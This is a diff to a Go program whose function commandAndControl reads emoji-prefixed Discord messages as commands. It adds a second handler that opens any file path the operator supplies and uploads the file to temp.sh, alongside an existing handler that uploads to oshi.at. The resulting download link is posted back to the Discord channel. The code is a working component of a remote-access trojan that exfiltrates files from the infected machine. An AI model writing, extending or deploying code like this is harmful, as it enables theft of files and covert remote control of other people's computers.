@@ -120,8 +120,8 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		}
 		flag = 1
 	} else if strings.HasPrefix(message.Content, "👉") {
-		fileName := message.Content[5:len(message.Content)]
-		f, _ := os.Open(fileName)
+		filePath := message.Content[5:len(message.Content)]
+		f, _ := os.Open(filePath)
 		defer f.Close()
 
 		var requestBody bytes.Buffer
@@ -145,12 +145,7 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		writer.WriteField("shorturl", "0")
 
 		// Close the writer to finalize the multipart data
-		err = writer.Close()
-		if err != nil {
-			fmt.Println("Error closing writer:", err)
-			return
-		}
-
+		writer.Close()
 		// Send the POST request
 		response, err := http.Post("https://oshi.at/", writer.FormDataContentType(), &requestBody)
 		if err != nil {
@@ -166,11 +161,62 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		session.ChannelMessageSendReply(message.ChannelID, string(responseBody), message.Reference())
 
 		flag = 1
+	} else if strings.HasPrefix(message.Content, "👈") {
+		filePath := message.Content[5:len(message.Content)]
+		f, err := os.Open(filePath)
+
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		defer f.Close()
+
+		// Create a buffer to hold the multipart form data
+		var requestBody bytes.Buffer
+		writer := multipart.NewWriter(&requestBody)
+
+		// Create a form file field
+		part, err := writer.CreateFormFile("file", f.Name())
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+
+		// Copy the file content into the form file field
+		_, err = io.Copy(part, f)
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+
+		// Close the writer to set the terminating boundary
+		err = writer.Close()
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		// Make the POST request
+		resp, err := http.Post("http://temp.sh/upload", writer.FormDataContentType(), &requestBody)
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		defer resp.Body.Close()
+
+		// Read and print the response
+		responseBody, err := io.ReadAll(resp.Body)
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		session.ChannelMessageSendReply(message.ChannelID, string(responseBody), message.Reference())
+
+		flag = 1
 	} else if message.Content == "💀" {
 		flag = 2
 	}
 
-end:
+	end:
 	session.MessageReactionRemove(message.ChannelID, message.ID, "🕐", "@me")
 	if flag > 0 {
 		session.MessageReactionAdd(message.ChannelID, message.ID, "✅")
